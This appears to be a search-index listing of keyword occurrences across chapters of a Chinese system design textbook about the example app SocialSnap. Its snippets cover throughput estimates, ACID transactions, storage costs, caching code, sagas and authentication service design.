  c21_b14.md: ...0,000 次写入/天  平均 QPS = 4,000,000 / 86,400 ≈ **46 次写入/秒**  峰值 QPS（按平均 3 倍）≈ **140 次写入/秒**  这在单个 PostgreSQL 实例写能力（1,000–5,000...
  c21_b14.md: ...b) 推送通知投递：**  500,000 DAU × 6 条收到消息/天 = 3,000,000 次推送/天  平均 QPS = 3,000,000 / 86,400 ≈ **35 次通知/秒**  峰值 QPS ≈ **105 次通知/秒**...
  c21_b14.md: ...0,000 次推送/天  平均 QPS = 3,000,000 / 86,400 ≈ **35 次通知/秒**  峰值 QPS ≈ **105 次通知/秒**  推送经过外部服务（iOS 用 APNs，Android 用 FCM）。约 100/秒...
  c23_b01.md: ...内返回前 10 个最相关结果 * 支持基本关键词搜索，按相关性和页面权威度排序 * 峰值处理 10 万（100,000）QPS 查询量  **约束（证据）：**  * 平均网页约 100KB HTML * 典型英文网页约含 2000 个不同词 *...
  c27_b13.md: ...rix） 中明确记录，标记为“若以后改变分片数量则是架构债务”，并设置 tripwire——当系统达到 X 用户或 Y QPS 时重新审视该决策。这把“未知的未知”变成“已知的 future work”，从而可管理。   ### 本章总结  本章...

=== usd (51 occurrences) ===
  c02_b09.md: ...Latency（延迟）**  **为什么持久性第一：** 确认后却丢失的写对银行是灾难性失败。如果用户转 1,000 USD，系统说“成功”却忘记了这笔事务（transaction），就有人损失了真金白银。任何速度或可用性都无法弥补。持久性不可...
  c04_b07.md: ...维护数据库的完整性约束——事务把数据库从一个有效状态移动到另一个有效状态。例如，一笔银行转账事务从一个账户减去 100 USD 并加到另一个账户，使数据库处于有效状态（没有创造或销毁钱）。这主要是应用层关注点——应用定义什么叫“有效”，数据库执行...
  c05_b08.md: ...释 ACID 性质。对每一性质，描述如果它被违反会发生什么。  **答案：** 考虑一笔从 Alice 账户转 100 USD 到 Bob 账户的转账，实现为两条 SQL 更新。  **没有原子性：** 从 Alice 扣款（`balance -...
  c05_b08.md: ...`）成功，但给 Bob 加款（`balance += 100`）失败（磁盘满、崩溃等）。现在 Alice 少了 100 USD，但 Bob 没收到。钱消失了。有了原子性，两条更新要么都成功，要么都不成功——没有部分状态。  **没有一致性：**...
  c05_b08.md: ...成功——没有部分状态。  **没有一致性：** 约束规定账户余额不能为负。没有一致性强制执行，Alice 可能从 50 USD 账户转出 100 USD，余额变成 -50 USD。有了一致性，数据库会整体拒绝违反非负余额约束的事务。  **没有隔...
  c05_b08.md: ...**没有一致性：** 约束规定账户余额不能为负。没有一致性强制执行，Alice 可能从 50 USD 账户转出 100 USD，余额变成 -50 USD。有了一致性，数据库会整体拒绝违反非负余额约束的事务。  **没有隔离性：** Alice 和...
  c05_b08.md: ...规定账户余额不能为负。没有一致性强制执行，Alice 可能从 50 USD 账户转出 100 USD，余额变成 -50 USD。有了一致性，数据库会整体拒绝违反非负余额约束的事务。  **没有隔离性：** Alice 和 Bob 同时从同一个 1...
  c05_b08.md: ...一致性，数据库会整体拒绝违反非负余额约束的事务。  **没有隔离性：** Alice 和 Bob 同时从同一个 100 USD 账户转出 100 USD。没有隔离，两个事务都读到当前余额 100 USD，都判断可以执行，都扣 100 USD——账...
  c05_b08.md: ...反非负余额约束的事务。  **没有隔离性：** Alice 和 Bob 同时从同一个 100 USD 账户转出 100 USD。没有隔离，两个事务都读到当前余额 100 USD，都判断可以执行，都扣 100 USD——账户最终变成 -100 US...
  c05_b08.md: ...lice 和 Bob 同时从同一个 100 USD 账户转出 100 USD。没有隔离，两个事务都读到当前余额 100 USD，都判断可以执行，都扣 100 USD——账户最终变成 -100 USD。有了隔离（至少 Repeatable Read...
  c05_b08.md: ...00 USD 账户转出 100 USD。没有隔离，两个事务都读到当前余额 100 USD，都判断可以执行，都扣 100 USD——账户最终变成 -100 USD。有了隔离（至少 Repeatable Read），一个事务会看到另一个的写入，第二个...
  c05_b08.md: ...SD。没有隔离，两个事务都读到当前余额 100 USD，都判断可以执行，都扣 100 USD——账户最终变成 -100 USD。有了隔离（至少 Repeatable Read），一个事务会看到另一个的写入，第二个失败。  **没有持久性：** A...
  c05_b08.md: ...peatable Read），一个事务会看到另一个的写入，第二个失败。  **没有持久性：** Alice 转 100 USD。数据库提交并告诉 Alice “成功。” 一秒后服务器崩溃，磁盘缓冲区还没刷盘。重启后，100 USD 转账没了——但...
  c05_b08.md: ...e 转 100 USD。数据库提交并告诉 Alice “成功。” 一秒后服务器崩溃，磁盘缓冲区还没刷盘。重启后，100 USD 转账没了——但 Alice 已被告知成功。有了持久性（预写日志），“成功”返回前转账已在磁盘上，崩溃恢复会重演它。...
  c06_b09.md: ...或接受可能与其他写入冲突的写入。系统承诺最终收敛到一致状态。  **ACID 具体后果：** 你从银行账户转出 100 USD。事务是原子和隔离的——转账中途的另一次查询永远不会看到“100 USD 已从你账户扣除但尚未记入收款方”的状态。如果数...
  c06_b09.md: ...ID 具体后果：** 你从银行账户转出 100 USD。事务是原子和隔离的——转账中途的另一次查询永远不会看到“100 USD 已从你账户扣除但尚未记入收款方”的状态。如果数据库在转账中途崩溃，它会回滚；你的 100 USD 还在。这是金融数据的...
  c06_b09.md: ...永远不会看到“100 USD 已从你账户扣除但尚未记入收款方”的状态。如果数据库在转账中途崩溃，它会回滚；你的 100 USD 还在。这是金融数据的正确行为——正确性高于可用性。  **BASE 具体后果：** 你在社交平台“点赞”一张照片。点赞...
  c08_b15.md: ...行内部的工作方式。  审计轨迹是监管要求：金融应用必须能解释每次状态变更。用事件溯源，“为什么我的余额是 432.17 USD？”有精确答案：这就是导致它的所有事件。  时间查询变得简单：“我 1 月 1 日余额是多少？”重放到 12 月 31...
  c10_b02.md: ...U 寄存器和缓存（L1/L2/L3）**  * 速度：亚纳秒级访问（0.5–10 纳秒） * 成本：约 100,000 USD/GB（实际上是 CPU 裸片成本的一部分） * 容量：千字节（L1）到兆字节（L3） * 存放内容：CPU 当前正在执...
  c10_b02.md: ...量和指令  **第 2 级：DRAM（内存）**  * 速度：约 100 纳秒（0.1 微秒） * 成本：约 5–10 USD/GB * 容量：每台服务器 GB 到 TB * 存放内容：工作数据、活跃数据库缓冲池、缓存（Redis、Memcach...
  c10_b02.md: ...**第 3 级：NVMe SSD**  * 速度：约 100 微秒（0.1 毫秒） * 成本：约 0.10–0.30 USD/GB * 容量：每块磁盘 TB * 存放内容：主数据库存储、活跃应用文件  **第 4 级：SATA SSD**  *...
  c10_b02.md: ...、活跃应用文件  **第 4 级：SATA SSD**  * 速度：约 0.5 毫秒 * 成本：约 0.05–0.10 USD/GB * 容量：每块磁盘 TB * 存放内容：对延迟不那么敏感的数据库存储、温存储  **第 5 级：HDD（机械硬盘...
  c10_b02.md: ...：HDD（机械硬盘）**  * 速度：约 10 毫秒（随机访问——磁盘必须物理寻道） * 成本：约 0.02–0.05 USD/GB * 容量：每块磁盘数十 TB * 存放内容：批量数据、冷备份、对延迟可容忍的大文件存储  **第 6 级：对象存...
  c10_b02.md: ...、GCS、Azure Blob）**  * 速度：约 10–100 毫秒（基于网络） * 成本：约 0.02–0.03 USD/GB/月（另加每次请求费用） * 容量：实际上无限 * 存放内容：用户上传文件、媒体、备份、大数据集  **第 7 级...
  c10_b02.md: ...**第 7 级：磁带 / 冷归档**  * 速度：分钟到小时（物理取回和寻道） * 成本：约 0.002–0.004 USD/GB/月 * 容量：实际上无限 * 存放内容：长期归档、合规数据、需要保留但几乎不读的数据  规律很清楚：速度每差一个...
  c10_b04.md: ...储获取图片。这意味着应用服务器的带宽不被媒体文件服务消耗。  **大规模便宜：** 对象存储每月约 0.02–0.03 USD/GB。一个 SocialSnap 用户上传 50 次头像照片（每次 2 MB），每月存储成本约 0.002 USD。经...
  c10_b04.md: ...3 USD/GB。一个 SocialSnap 用户上传 50 次头像照片（每次 2 MB），每月存储成本约 0.002 USD。经济学与把同样数据存在 SSD 数据库中根本不同。...
  c10_b11.md: ...上传、多次读取。读取可容忍 50-200ms 延迟（视频播放器会提前缓冲）。平台可能存储 PB 级视频。按 0.023 USD/GB/月 计，存 1 PB 每月 23,000 USD——只有 SSD 成本的零头（100,000+ USD/月）。...
  c10_b11.md: ...播放器会提前缓冲）。平台可能存储 PB 级视频。按 0.023 USD/GB/月 计，存 1 PB 每月 23,000 USD——只有 SSD 成本的零头（100,000+ USD/月）。  访问模式：按 URL key 顺序读取大二进制对象。延...
  c10_b11.md: ....023 USD/GB/月 计，存 1 PB 每月 23,000 USD——只有 SSD 成本的零头（100,000+ USD/月）。  访问模式：按 URL key 顺序读取大二进制对象。延迟要求：几十到几百毫秒可接受。成本：PB 级唯一经济可...
  c10_b11.md: ...ID、商品、价格、送货地址、状态）。需要复杂查询：“显示过去 24 小时内所有状态为 pending、总额超过 500 USD 的订单，并与客户送货偏好 join。”这些查询跨多张表，需要索引和 join。延迟要求是个位数毫秒（订单状态页必须快速...
  c14_b10.md: ...问的副本及该副本落后程度不同而看到不同值。  强一致性必要场景：用户银行余额。如果 Alice 给 Bob 转 100 USD，Alice 账户扣减和 Bob 账户贷记必须强一致。如果任一节点的后续读仍能返回转账前 Alice 的余额，她可能再次...
  c14_b10.md: ...扣减和 Bob 账户贷记必须强一致。如果任一节点的后续读仍能返回转账前 Alice 的余额，她可能再次转出同样 100 USD，导致双重支付。  最终一致性可接受场景：SocialSnap 帖子的显示点赞数。如果一条帖子有 10,247 个赞，而...
  c15_b03.md: ...执行了两次。如果任务是“给用户 42 发邮件”，用户 42 收到两封邮件。如果任务是“给用户 42 信用卡扣 9.99 USD”，用户 42 被扣两次。重复投递是真正的问题。  **恰好一次处理**（每条消息只处理一次，不多不少）在分布式系统中不...
  c15_b03.md: ...幂等（若写正确）。  有些操作天然非幂等：  * `CHARGE user 42's credit card 9.99 USD`——执行两次就扣两次。 * `INCREMENT post 99's like count`——执行两次就加两次。 *...
  c15_b05.md: ...向操作 | 补偿事务 |---|---|---|--- 1 | Payment Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置 user 42 的 `is_premium =...
  c15_b05.md: ...-|---|---|--- 1 | Payment Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置 user 42 的 `is_premium = true` | 设置 us...
  c15_b06.md: ...个服务，接收结果，决定下一步做什么。  高级版升级编排器：  1. 调用 Payment Service：扣 9.99 USD。等待结果。 2. 若成功：调用 User Service：设置 `is_premium = true`。等待结果。 3...
  c15_b09.md: ...收到事件并开始协调。  **第 3 步：** 编排器调用 Payment Service：“给用户 42 扣 9.99 USD，幂等键 `saga_7f3a9b2c_charge`。”  **第 4 步：** Payment Service 检查...
  c24_b10.md: ...）或前 14 天（电影）获得其终身播放量的 90%。设计一个平衡成本和访问延迟的存储生命周期策略，已知热存储 0.05 USD/GB/月、温存储 0.01 USD/GB/月、冷存储 0.001 USD/GB/月。...
  c24_b10.md: ...放量的 90%。设计一个平衡成本和访问延迟的存储生命周期策略，已知热存储 0.05 USD/GB/月、温存储 0.01 USD/GB/月、冷存储 0.001 USD/GB/月。...
  c24_b10.md: ...延迟的存储生命周期策略，已知热存储 0.05 USD/GB/月、温存储 0.01 USD/GB/月、冷存储 0.001 USD/GB/月。...
  c24_b11.md: ...门内容（保持每日 100+ 播放）。365 天后：所有内容归档。1TB 内容 12 个月成本比较：全热：12 × 50 USD = 600 USD。策略（1 周热、3 周温、11 个月冷）：50 USD × 0.25 + 10 USD × 0.7...
  c24_b11.md: ...00+ 播放）。365 天后：所有内容归档。1TB 内容 12 个月成本比较：全热：12 × 50 USD = 600 USD。策略（1 周热、3 周温、11 个月冷）：50 USD × 0.25 + 10 USD × 0.75 + 1 USD...
  c24_b11.md: ...12 个月成本比较：全热：12 × 50 USD = 600 USD。策略（1 周热、3 周温、11 个月冷）：50 USD × 0.25 + 10 USD × 0.75 + 1 USD × 11 = 12.50 USD + 7.50 USD...
  c24_b11.md: ...× 50 USD = 600 USD。策略（1 周热、3 周温、11 个月冷）：50 USD × 0.25 + 10 USD × 0.75 + 1 USD × 11 = 12.50 USD + 7.50 USD + 11 USD = 31 US...
  c24_b11.md: ...USD。策略（1 周热、3 周温、11 个月冷）：50 USD × 0.25 + 10 USD × 0.75 + 1 USD × 11 = 12.50 USD + 7.50 USD + 11 USD = 31 USD。分层策略成本约为始终热存储...
  c24_b11.md: ...、11 个月冷）：50 USD × 0.25 + 10 USD × 0.75 + 1 USD × 11 = 12.50 USD + 7.50 USD + 11 USD = 31 USD。分层策略成本约为始终热存储的 5%。若 250 PB 总内容...
  c24_b11.md: ...USD × 0.25 + 10 USD × 0.75 + 1 USD × 11 = 12.50 USD + 7.50 USD + 11 USD = 31 USD。分层策略成本约为始终热存储的 5%。若 250 PB 总内容中 90% 在冷存储，...
  c24_b11.md: ...25 + 10 USD × 0.75 + 1 USD × 11 = 12.50 USD + 7.50 USD + 11 USD = 31 USD。分层策略成本约为始终热存储的 5%。若 250 PB 总内容中 90% 在冷存储，节省巨大。冷请求的...
  c24_b11.md: ...SD × 0.75 + 1 USD × 11 = 12.50 USD + 7.50 USD + 11 USD = 31 USD。分层策略成本约为始终热存储的 5%。若 250 PB 总内容中 90% 在冷存储，节省巨大。冷请求的小访问延迟惩罚（2...

=== profile (49 occurrences) ===
  c07_b07.md: ...user_profile(user_id):         cache_key = f"user:{user_id}:profile"          # Check cache         cached = redis.get(cache_ke...
  c07_b07.md: ...# Cache hit          # Cache miss — query database         profile = db.query("SELECT * FROM users WHERE id = %s", [user_id])...
  c07_b07.md: ....setex(cache_key, 300, json.dumps(profile))          return profile      def update_user_profile(user_id, new_bio):         # W...
  c07_b07.md: ...# Invalidate cache         redis.delete(f"user:{user_id}:profile")   **影响：** 如果 95% 的资料请求是针对资料已缓存的用户（最流行用户和最近活跃用户），数据库现在每秒只收...
  c09_b08.md: ...页（含最近帖子和粉丝数），你可能需要：       GET /users/42           → Alice's profile     GET /users/42/posts     → Alice's recent posts     GET...
  c10_b04.md: ...数据本身（文件、图片、视频、文档——任何字节） * 一个 **key**（唯一标识符——通常像路径：`users/42/profile-photo.jpg`） * **元数据**（content type、自定义属性、标签）  对象通过 HTTP API...
  c10_b04.md: ...Bucket: socialsnap-media         Object key: users/42/profile-photo.jpg         Object key: users/42/cover-photo.jpg...
  c10_b06.md: ...WHERE id = 42`。 6. 使用 Redis 使该用户资料缓存失效（第 7 章）：`DEL user:42:profile`。  照片服务工作流：  1. 用户请求 Alice 的资料页。 2. 应用返回资料页，包含 `<img src="h...
  c10_b14.md: ...QL `users` 表的 `photo_url` 列。该列包含在第 7 章的资料缓存中（key `user:{id}:profile`）。用户更新头像时，确保以下目标的正确操作顺序是什么：(a) 新照片已存储，(b) 数据库有正确 URL，(c) 缓存...
  c10_b14.md: ...eSQL 的 users.photo_url 为新 URL     3. 使 Redis 缓存 key user:42:profile 失效     4. （异步，通过消息队列）从对象存储删除旧照片   **为什么这个顺序重要：**  第 1、2 步必须...
  c10_b15.md: ...同步更新。现在存新 URL。这是权威记录——所有其他缓存都源自它。  **3. Redis 资料缓存（`user:42:profile`）：** 包含序列化用户资料（含旧 `photo_url`）。必须显式失效（上传序列第 3 步：`DEL user:4...
  c10_b15.md: ...：** 包含序列化用户资料（含旧 `photo_url`）。必须显式失效（上传序列第 3 步：`DEL user:42:profile`）。删除后，下一次资料读取从 PostgreSQL 取新数据（现在含新 URL），并重新缓存正确条目。如果 Redis...
  c11_b13.md: ...user_profile(user_id):         cache_key = f"user:{user_id}:profile"         cached = local_cache.get(cache_key)  # 进程内 Python...
  c11_b13.md: ...300 秒）         if cached:             return cached         profile = db.query("SELECT * FROM users WHERE id = %s", [user_id])...
  c11_b13.md: ...ERE id = %s", [user_id])         local_cache.set(cache_key, profile, ttl=300)         return profile   找出在三台服务器部署中该实现的问题。它导致哪类...
  c11_b13.md: ...local_cache.set(cache_key, profile, ttl=300)         return profile   找出在三台服务器部署中该实现的问题。它导致哪类 bug，应如何修复？...
  c11_b14.md: ...ostgreSQL。 3. Server A 从**它自己的** `local_cache` 中删除 `user:42:profile`。 4. Server B 和 Server C 仍缓存着旧资料。  在接下来的 5 分钟（缓存 TTL）内，任何路由...
  c11_b14.md: ...user_profile(user_id):         cache_key = f"user:{user_id}:profile"         cached = redis.get(cache_key)          # 共享 Redis，...
  c11_b14.md: ...if cached:             return json.loads(cached)         profile = db.query("SELECT * FROM users WHERE id = %s", [user_id])...
  c11_b14.md: ...e_key, 300, json.dumps(profile))  # 共享 Redis         return profile      def update_user_profile(user_id, new_data):         db...
  c11_b14.md: ...%s", [..., user_id])         redis.delete(f"user:{user_id}:profile")  # 一次删除对所有服务器失效   因为所有服务器共享同一个 Redis 实例，任何服务器的 `DEL` 命令都同...
  c17_b04.md: ...失败时产生的两种日志消息：  **非结构化日志：**       ERROR: Failed to load user profile for request from 192.168.1.45   **结构化日志：**       {       "t...
  c17_b04.md: ...5T14:47:23.441Z",       "level": "ERROR",       "service": "profile-service",       "event": "profile_load_failed",       "user...
  c27_b02.md: ...#### v2 —— 第 7 章：添加缓存（第 3–6 个月）  **它是什么：** Redis 作为缓存层引入。Profile 查找带 TTL 缓存。第一次陈旧 bug：用户更新了用户名，但缓存版本最多 60 秒仍显示旧名。  **关键决策：**...
  c27_b02.md: ...秒仍显示旧名。  **关键决策：**  * Cache-aside 模式：应用先查缓存，未命中回数据库，回写缓存 * Profile 数据 TTL 60 秒 * Redis 部署在独立服务器  **为什么正确：** 1 万（10000）用户时，数据库每...
  c27_b02.md: ...秒 * Redis 部署在独立服务器  **为什么正确：** 1 万（10000）用户时，数据库每分钟收到数千次相同 profile 查询。缓存使数据库负载降低约 80%，响应时间回到可接受水平。  **技术债务：** 缓存失效策略不一致——某些写路径...
  c27_b02.md: ...—某些写路径在写入时失效缓存，另一些没有。三个月内，团队遇到影响约 3% 用户的缓存不一致 bug（编辑后用户仍看到旧 profile 数据）。  **调试教训：** 团队花了三天调试这个缓存不一致。修复后，他们确立规则：缓存失效代码必须与写入方法在同一...
  c27_b02.md: ...#### v2 —— 第 7 章：添加缓存（第 3–6 个月）  **它是什么：** Redis 作为缓存层引入。Profile 查找带 TTL 缓存。第一次陈旧 bug：用户更新了用户名，但缓存版本最多 60 秒仍显示旧名。  **关键决策：**...
  c27_b02.md: ...秒仍显示旧名。  **关键决策：**  * Cache-aside 模式：应用先查缓存，未命中回数据库，回写缓存 * Profile 数据 TTL 60 秒 * Redis 部署在独立服务器  **为什么正确：** 1 万（10000）用户时，数据库每...
  c27_b02.md: ...秒 * Redis 部署在独立服务器  **为什么正确：** 1 万（10000）用户时，数据库每分钟收到数千次相同 profile 查询。缓存使数据库负载降低约 80%，响应时间回到可接受水平。  **技术债务：** 缓存失效策略不一致——某些写路径...
  c27_b02.md: ...—某些写路径在写入时失效缓存，另一些没有。三个月内，团队遇到影响约 3% 用户的缓存不一致 bug（编辑后用户仍看到旧 profile 数据）。  **调试教训：** 团队花了三天调试这个缓存不一致。修复后，他们确立规则：缓存失效代码必须与写入方法在同一...
  c27_b03.md: ...rs 表被分片——SocialSnap 数据首次跨多个数据库分割。  **关键决策：**  * 读取副本用于 feed、profile 读取和搜索查询 * 所有写入使用一个主库 * 分片键选择：`user_id mod 8` —— 用户分布在 8 个数据...
  c27_b06.md: ...以写吞吐限制为代价获得强一致性和持久性。”  **v2（添加缓存）时：** “Redis cache-aside 用于 profile——以陈旧和缓存失效复杂度为代价获得低延迟读。”  **v5（分片）时：** “User 表分片（mod N）——写吞吐...
  c27_b10.md: ...应用问题  **Q1.** SocialSnap 工程团队正在决定是否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理认证和会话管理）。他们应问哪些问题...
  c27_b10.md: ...Snap 工程团队正在决定是否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理认证和会话管理）。他们应问哪些问题来判断这次拆分是否值得？拆分引入哪些权衡？...
  c27_b10.md: ...profile 数据和 auth 数据是否以不同速率或因不同原因变化？Auth（登录会话、凭证）安全关键且对变化敏感；profile 数据（用户名、简介、照片）对产品功能敏感。不同变化速率暗示不同服务。(2) 不同团队是否负责这些职责？若安全团队拥有...
  c27_b10.md: ...片）对产品功能敏感。不同变化速率暗示不同服务。(2) 不同团队是否负责这些职责？若安全团队拥有 auth、产品团队拥有 profile，拆分遵循自然团队边界——主动应用康威定律。(3) 是否有显著运营差异？Auth 需要始终高可用性（availabili...
  c27_b10.md: ...应用康威定律。(3) 是否有显著运营差异？Auth 需要始终高可用性（availability）（登录失败是灾难性的）；profile 数据可容忍短暂中断。不同 SLO 暗示不同服务。(4) 是否有性能差异？Auth 在每次 API 调用的关键路径上（每...
  c27_b10.md: ...SLO 暗示不同服务。(4) 是否有性能差异？Auth 在每次 API 调用的关键路径上（每次调用都验证 token）；profile 数据不需要那么频繁。Auth 可能受益于不同缓存策略。拆分的权衡：好处：独立部署；安全团队可在不涉及产品团队的情况下迭...
  c27_b10.md: ...不涉及产品团队的情况下迭代 auth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细降级设计（Auth 宕...
  c27_b10.md: ...应用问题  **Q1.** SocialSnap 工程团队正在决定是否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理认证和会话管理）。他们应问哪些问题...
  c27_b10.md: ...Snap 工程团队正在决定是否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理认证和会话管理）。他们应问哪些问题来判断这次拆分是否值得？拆分引入哪些权衡？...
  c27_b10.md: ...profile 数据和 auth 数据是否以不同速率或因不同原因变化？Auth（登录会话、凭证）安全关键且对变化敏感；profile 数据（用户名、简介、照片）对产品功能敏感。不同变化速率暗示不同服务。(2) 不同团队是否负责这些职责？若安全团队拥有...
  c27_b10.md: ...片）对产品功能敏感。不同变化速率暗示不同服务。(2) 不同团队是否负责这些职责？若安全团队拥有 auth、产品团队拥有 profile，拆分遵循自然团队边界——主动应用康威定律。(3) 是否有显著运营差异？Auth 需要始终高可用性（availabili...
  c27_b10.md: ...应用康威定律。(3) 是否有显著运营差异？Auth 需要始终高可用性（availability）（登录失败是灾难性的）；profile 数据可容忍短暂中断。不同 SLO 暗示不同服务。(4) 是否有性能差异？Auth 在每次 API 调用的关键路径上（每...
  c27_b10.md: ...SLO 暗示不同服务。(4) 是否有性能差异？Auth 在每次 API 调用的关键路径上（每次调用都验证 token）；profile 数据不需要那么频繁。Auth 可能受益于不同缓存策略。拆分的权衡：好处：独立部署；安全团队可在不涉及产品团队的情况下迭...
  c27_b10.md: ...不涉及产品团队的情况下迭代 auth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细降级设计（Auth 宕...
  c27_b11.md: ...失 v1 → v2 | 添加 Redis 缓存 | 以陈旧和缓存失效复杂度为代价获得更低读延迟 | 数据库 CPU 高；profile 读取慢 v2 → v3 | 添加消息队列 | 以最终投递和监控复杂度为代价获得解耦写（更快 API） | 邮件投递阻塞...
  c27_b12.md: ...有收入前招聘这些人员也贵得不可能。第三，每个阶段添加的组件都是因为它解决了具体的、观察到的问题。Redis 缓存是因为 profile 读取慢才加的；消息队列是因为邮件投递阻塞 API 响应才加的。每个组件都是先有问题再 earned。这不是“一开始就把...

=== auth (48 occurrences) ===
  c17_b06.md: ...微服务架构，单次用户请求加载 news feed 可能调用五个服务：  1. API Gateway——接收请求，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3. Feed Service—...
  c17_b06.md: ...eed 可能调用五个服务：  1. API Gateway——接收请求，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Ser...
  c17_b06.md: ...45ms]  API Gateway: handle GET /feed         [5ms - 20ms]   Auth Service: validate_jwt (15ms)         [22ms - 240ms] Feed Se...
  c17_b12.md: ...PU、内存）。  **Q3.** 一次用户登录请求的分布式追踪显示以下 spans：API Gateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span。Auth Service 对该 trace...
  c17_b12.md: ...户登录请求的分布式追踪显示以下 spans：API Gateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span。Auth Service 对该 trace ID 的日志条目为：`INFO vali...
  c17_b12.md: ...API Gateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span。Auth Service 对该 trace ID 的日志条目为：`INFO validate_jwt (5ms)`、`INFO...
  c17_b12.md: ...设，然后设计测试在行动前证实或证伪它。  **答案：** 已收集证据：登录请求总耗时 390ms，其中 380ms 在 Auth Service。Auth Service 内部，JWT 验证很快（5ms），用户资料缓存很快（2ms），但数据库获取很...
  c17_b12.md: ...实或证伪它。  **答案：** 已收集证据：登录请求总耗时 390ms，其中 380ms 在 Auth Service。Auth Service 内部，JWT 验证很快（5ms），用户资料缓存很快（2ms），但数据库获取很慢（370ms）——几乎占...
  c17_b12.md: ...可能原因：(a) 查询查找列（用户 ID 或邮箱）缺少索引，(b) 数据库高负载导致查询排队，(c) 数据库连接池饱和，Auth Service 在执行查询前等待连接。  **下一步调查：**  1. 检查 Auth Service 数据库连接池指...
  c17_b12.md: ...排队，(c) 数据库连接池饱和，Auth Service 在执行查询前等待连接。  **下一步调查：**  1. 检查 Auth Service 数据库连接池指标——池利用率是否高？ 2. 检查该时段数据库慢查询日志——是这条特定查询慢，还是数据库...
  c17_b12.md: ...= ?` 的 `EXPLAIN` 输出——是否使用索引？ 4. 检查这是孤立事件（一次慢追踪）还是系统性（该时段所有 Auth Service DB 查询都慢）。  这就是应用的侦探纪律：证据足够具体以形成假设，假设产生可证伪的测试，只需一个测试...
  c18_b12.md: ...，并把代码部署与用户可见发布分离。  **Q2.** SocialSnap staging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆...
  c18_b12.md: ...aging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service 恢复后 Fe...
  c18_b12.md: ...Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service 恢复后 Feed Service 同时尝试处理这 5000 个请求，压垮它并导致二次失败。诊断该模式并...
  c18_b13.md: ...**答案：** 这是服务恢复场景中的惊群问题。Auth Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth...
  c18_b13.md: ...Auth Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth Service 恢复后，所有 5000 个等待请求同时调用它，在它完全预热前压垮它。  **根因：** Feed Se...
  c18_b13.md: ...有 5000 个等待请求同时调用它，在它完全预热前压垮它。  **根因：** Feed Service 没有任何限制对 Auth Service 并发调用的机制。恢复期间，它表现得好像 Auth Service 容量无限。  **修复——多层：**...
  c18_b13.md: ...根因：** Feed Service 没有任何限制对 Auth Service 并发调用的机制。恢复期间，它表现得好像 Auth Service 容量无限。  **修复——多层：**  1. **熔断器（第 16 章）：** Feed Servic...
  c18_b13.md: ...ice 容量无限。  **修复——多层：**  1. **熔断器（第 16 章）：** Feed Service 应在 Auth Service 调用上设熔断器。Auth 宕机时熔断器打开，请求快速失败而不是堆积。这完全避免堆积，但意味着用户在 A...
  c18_b13.md: ...*  1. **熔断器（第 16 章）：** Feed Service 应在 Auth Service 调用上设熔断器。Auth 宕机时熔断器打开，请求快速失败而不是堆积。这完全避免堆积，但意味着用户在 Auth outage 期间看到错误而非排队...
  c18_b13.md: ...h Service 调用上设熔断器。Auth 宕机时熔断器打开，请求快速失败而不是堆积。这完全避免堆积，但意味着用户在 Auth outage 期间看到错误而非排队——这是值得做的权衡。 2. **请求超时并快速失败：** Feed Service...
  c18_b13.md: ...而非排队——这是值得做的权衡。 2. **请求超时并快速失败：** Feed Service 不应无限等待认证，而应将 Auth 调用超时设为例如 2 秒。这防止线程堆积，但意味着用户在 Auth outage 期间经历错误而不是排队。 3. **...
  c18_b13.md: ...Feed Service 不应无限等待认证，而应将 Auth 调用超时设为例如 2 秒。这防止线程堆积，但意味着用户在 Auth outage 期间经历错误而不是排队。 3. **带指数退避和抖动的重试（第 15 章幂等性讨论）：** 如果 Fee...
  c18_b13.md: ...是排队。 3. **带指数退避和抖动的重试（第 15 章幂等性讨论）：** 如果 Feed Service 重试失败的 Auth 调用，必须使用指数退避和抖动，让数千并发请求的重试不会同时触发。没有抖动，重试会同步并重新造成惊群。 4. **恢复时...
  c18_b13.md: ...数退避和抖动，让数千并发请求的重试不会同时触发。没有抖动，重试会同步并重新造成惊群。 4. **恢复时的负载削减：** Auth Service 在启动阶段应限制入站请求。重启后的前 30 秒最多接受 500 RPS，逐渐增加到满容量以完成预热。...
  c19_b03.md: ...改。Feed Service 可以从 payload 中提取 `user_id` 和 `scope` 而无需每次都调用 auth 服务器——密码学签名提供了信任。  这就是无状态认证：服务器不需要查数据库来验证 token。token 是自包含的。...
  c19_b09.md: ...务自动更新。 4. 对特定密钥的访问由策略控制：Feed Service 只能访问 feed 数据库的凭证——不能访问 auth 数据库凭证或支付服务凭证。这就是最小权限原则在密钥上的应用。  **密钥管理最重要规则：** 永远不要向版本控制提交密...
  c19_b15.md: ...情况下查询“这个手机号是否已注册？”。哈希是单向的——适合等值查找，不适合显示号码。  3. **访问控制：** 只有 Auth Service 能解密手机号。Feed Service、Post Service 和其他服务没有手机号解密密钥。需要显...
  c19_b15.md: ...号。Feed Service、Post Service 和其他服务没有手机号解密密钥。需要显示后 4 位的支持工具通过 Auth Service API 访问——并受审计。  4. **审计日志：** 每次访问用户手机号——无论是系统（发送 SMS...
